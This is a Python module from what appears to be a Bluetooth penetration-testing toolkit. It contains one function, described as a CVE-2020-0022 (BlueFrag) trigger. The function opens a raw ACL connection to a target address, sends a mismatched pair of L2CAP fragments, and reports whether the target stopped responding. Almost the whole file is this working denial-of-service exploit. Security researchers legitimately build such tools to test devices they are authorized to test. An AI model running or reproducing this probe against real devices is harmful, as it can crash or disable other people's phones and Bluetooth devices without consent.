"""DoS-oriented raw ACL CVE probes."""

from __future__ import annotations

import struct
import time
from typing import Any

from blue_tap.fuzz.transport import RawACLTransport


def bluefrag_crash_probe(address: str, hci: str = "hci1",
                         continuation_shortfall: int = 2) -> dict[str, Any]:
    """CVE-2020-0022 destructive raw ACL fragment mismatch trigger."""
    hci_idx = int(hci.replace("hci", "")) if hci.startswith("hci") else 1
    start = time.time()
    transport = RawACLTransport(address, hci_dev=hci_idx, timeout=5.0)
    if not transport.connect():
        return {
            "target": address,
            "attack": "bluefrag_crash_probe",
            "attack_name": "bluefrag_crash_probe",
            "packets_sent": 0,
            "duration_seconds": round(time.time() - start, 2),
            "result": "error",
            "notes": "RawACL transport unavailable",
        }

    try:
        declared_l2cap_len = 100
        echo_payload_len = 96
        actual_payload_len = max(1, echo_payload_len - max(continuation_shortfall, 1))
        first_fragment = struct.pack(
            "<HHBBH",
            declared_l2cap_len,
            0x0001,
            0x08,
            0x41,
            echo_payload_len,
        )
        second_fragment = b"\xAA" * actual_payload_len

        sent = 0
        if transport._hci_vsc.send_raw_acl(transport._connection_handle, first_fragment, pb=0x02):
            sent += 1
        time.sleep(0.05)
        if transport._hci_vsc.send_raw_acl(transport._connection_handle, second_fragment, pb=0x03):
            sent += 1
        time.sleep(0.25)
        alive = transport.is_alive()
        return {
            "target": address,
            "attack": "bluefrag_crash_probe",
            "attack_name": "bluefrag_crash_probe",
            "packets_sent": sent,
            "duration_seconds": round(time.time() - start, 2),
            "result": "target_unresponsive" if not alive else "success",
            "notes": (
                "ACL link disappeared after destructive raw ACL fragment mismatch trigger"
                if not alive
                else f"Target remained reachable after raw ACL trigger (shortfall={continuation_shortfall})"
            ),
        }
    finally:
        transport.close()
